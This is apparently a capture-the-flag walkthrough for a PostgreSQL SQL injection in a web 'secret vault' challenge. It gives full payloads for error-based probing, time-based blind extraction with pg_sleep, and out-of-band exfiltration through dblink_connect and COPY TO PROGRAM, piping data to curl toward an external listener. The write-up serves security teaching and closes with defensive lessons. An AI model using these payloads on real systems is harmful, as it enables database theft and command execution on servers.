---
title: "PicoCTF - Secret Box"
description: "A complete walkthrough for the Secret Box challenge on learn.cylabacademy.org. The application promises your secrets are safe — but are the admin's secrets just as protected? Find out how a single character breaks everything open."
pubDate: 2026-10-21
platform: "PicoCTF"
difficulty: "Medium"
tags: ["SQL Injection", "PostgreSQL", "Blind SQLi", "OOB", "COPY TO PROGRAM", "Error-based"]
category: "Web"
ipAddress: "chatelaine.cylabacademy.net:35763"
---

Secret Box is a web challenge hosted on [learn.cylabacademy.org](https://learn.cylabacademy.org) as part of PicoCTF. The application presents itself as a personal secret vault — only you can see what's inside. The challenge is to uncover the admin's secret. Source code is provided, giving a head start on understanding the backend before even touching the application.

---

## Source Code Review

The challenge provides access to the source code. Starting here rather than diving straight into the application is always the right call — it saves significant enumeration time.

The most valuable file is `initdb.sql`, which reveals the full database schema and the seeded data:

```sql
CREATE TABLE users (
    id text PRIMARY KEY DEFAULT gen_random_uuid(),
    username text NOT NULL,
    password text NOT NULL,
    created_at timestamptz NOT NULL DEFAULT now()
);

CREATE TABLE tokens (
    id text PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id text NOT NULL REFERENCES users(id),
    created_at timestamptz NOT NULL DEFAULT now(),
    expired_at timestamptz NOT NULL DEFAULT now() + interval '1 days'
);

CREATE TABLE secrets (
    id text PRIMARY KEY DEFAULT gen_random_uuid(),
    owner_id text NOT NULL REFERENCES users(id),
    content text NOT NULL,
    created_at timestamptz NOT NULL DEFAULT now()
);

INSERT INTO users(id, username, password)
  VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'admin', 'fake_password');

INSERT INTO secrets(owner_id, content)
  VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'academy{fake_flag}');
```

A few things stand out:
- The `secrets` table stores content per user, referenced via `owner_id`
- An admin user is pre-seeded with a fixed UUID — and already has a secret stored
- The use of `gen_random_uuid()` from the `pgcrypto` extension confirms the backend is **PostgreSQL**

> [!TIP]
> When source code is provided, always start with database schema and seed files. They often hand you the exact table names, column names, and seed data — eliminating the need to enumerate the database from scratch.

---

## Web Application Enumeration

### Initial Recon

The application presents a **Secret Vault** — a personal space to store secrets. The landing page greets users with:

> *"Secrets that deserve a better hiding place? Welcome to your personal vault — Only You can see."*

Two options are available: **Login** and **Sign Up**.

### Testing the Login Page

After registering a new account, I tested the login form for SQL injection — trying special characters, `OR 1=1 --`, `AND 1=1 --`, and similar error-based payloads.

The login form showed **no signs of injection** — no errors, no behavioural changes. Moving on.

---

## Discovering the Injection Point

### Creating a Secret

After logging in, the application provides a **"Create New Secret"** feature. Each secret submitted is assigned a unique ID and stored in the vault.

Instead of submitting normal text, I injected a single quote `'` into the content field and submitted.

### Error Response

The server responded with a raw PostgreSQL error:

```text
error: INSERT INTO secrets(owner_id, content) VALUES ('cd749859-0f8b-4aa9-8f33-6a2aafa65f5c', ''') - unterminated quoted string at or near "''')"
```

![SQL error response leaking the raw INSERT query](/vapt-knowledge-base/images/secret-box/error_response.png)

This immediately confirmed:
1. The **exact query structure**: `INSERT INTO secrets(owner_id, content) VALUES ('<uuid>', '<input>')`
2. The backend is **PostgreSQL**
3. User input is being **directly interpolated** into the query — no parameterisation

### Verifying Control

To verify quote control, I submitted `'')"` — two single quotes followed by a closing parenthesis:

```text
'')"
```

No error was returned. The injected quotes balanced out the query syntax, confirming we have full control over the input.

![No error observed — query syntax successfully balanced](/vapt-knowledge-base/images/secret-box/verifying_control.png)

> [!NOTE]
> A verbose SQL error leaking the raw query is one of the most valuable findings in a web assessment. It removes the need to guess the query structure and allows crafting precise injection payloads from the start.

---

## Exploitation

### Stage 1 — Confirming Time-Based Blind SQLi

With the query structure known, the next step was confirming we could execute arbitrary SQL. Since the application doesn't reflect query output, I used **`pg_sleep()`** as a side-channel — a time delay as a YES/NO signal.

Using stacked queries to break out of the `INSERT` statement:

```sql
'); SELECT pg_sleep(5); --
```

This produces:

```sql
-- Original INSERT terminated early
INSERT INTO secrets(owner_id, content) VALUES ('uuid', '');

-- Injected query
SELECT pg_sleep(5);

-- Remainder commented out
--')
```

✔ A **~6 second delay** was observed — arbitrary SQL execution confirmed.

![~6 second response delay confirming pg_sleep execution](/vapt-knowledge-base/images/secret-box/time_based_confirmation.png)

---

### Stage 2 — Planning Data Extraction

The flag is stored in:

```sql
SELECT content FROM secrets WHERE owner_id = 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb';
```

Two approaches were considered for extraction:

**Option A — Time-Based Character Extraction**
Confirm the flag length, then extract one character at a time using conditional delays:

```sql
'||(SELECT CASE WHEN SUBSTRING(content,1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb' LIMIT 1)||'
```

This works but is slow — up to 95 requests per character for brute force, or ~7 with binary search on ASCII values.

**Option B — Out-of-Band (OOB) Exfiltration**
Send the entire flag to an external listener in a single request. Significantly faster and more reliable.

I opted for **OOB** using a **Burp Collaborator** listener.

---

### Stage 3 — Out-of-Band Exfiltration

#### Attempt 1: `dblink_connect()` — Failed

`dblink` is a PostgreSQL extension that opens a connection to a remote PostgreSQL server. Attackers abuse it by embedding exfiltrated data inside the hostname parameter, causing the database server to make an outbound DNS/TCP request to an attacker-controlled listener — carrying the stolen data with it.

```sql
'||(SELECT dblink_connect('host='||(SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb')||'59clsayskm3na1qxr22i5t6rkiq9ez2o.oastify.com user=a password=a dbname=a'))||'
```

```text
error: function dblink_connect(text) does not exist
```

The `dblink` extension is not installed on this PostgreSQL instance. Pivoting to the next method.

#### Attempt 2: `COPY TO PROGRAM`

`COPY TO PROGRAM` is a native PostgreSQL command (available to superusers) that pipes the output of a SQL query directly into a shell command. Attackers leverage this to pass query results to system utilities like `curl` or `wget`, sending the data over HTTP to an attacker-controlled server in a single request.

```sql
'); COPY (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb') TO PROGRAM 'curl http://59clsayskm3na1qxr22i5t6rkiq9ez2o.oastify.com/?f=$(cat -)  --data-binary @-'; --
```

Breaking down what this does:

```sql
-- Terminate the original INSERT early
');

-- Select the flag content from the secrets table
-- and pipe it as stdin to curl
COPY (
  SELECT content FROM secrets
  WHERE owner_id = 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb'
) TO PROGRAM 'curl http://xxxx.oastify.com/?f=$(cat -) --data-binary @-';

-- Comment out the remaining original SQL
--')
```

✔ Burp Collaborator received an inbound HTTP request with the flag carried in the `f=` query parameter.

![Burp Collaborator receiving the flag via HTTP request](/vapt-knowledge-base/images/secret-box/oob_exfiltration.png)

> [!IMPORTANT]
> `COPY TO PROGRAM` requires the PostgreSQL process to run with **superuser** privileges. In many CTF environments and misconfigured production deployments, the database runs as a superuser — making this a highly effective one-shot exfiltration technique when available.

---

## Attack Chain Summary

| Stage | Technique | Outcome |
|-------|-----------|---------|
| 1 | Source code review | Identified DB schema, flag location, and admin UUID |
| 2 | Error-based SQLi | Leaked raw query structure and confirmed PostgreSQL |
| 3 | Time-based Blind (`pg_sleep`) | Confirmed arbitrary SQL execution (~6s delay) |
| 4 | OOB (`COPY TO PROGRAM` + `curl`) | Exfiltrated full flag in a single HTTP request |

---

## Key Takeaways

- **Never interpolate user input** into SQL strings — always use parameterised queries or prepared statements.
- **Verbose SQL errors** that leak raw query structure are a critical misconfiguration — suppress them in production.
- **PostgreSQL's `COPY TO PROGRAM`** turns SQL injection into OS command execution when the DB process has superuser privileges.
- **OOB exfiltration** is significantly faster than time-based character-by-character extraction — always attempt it before falling back to blind extraction.
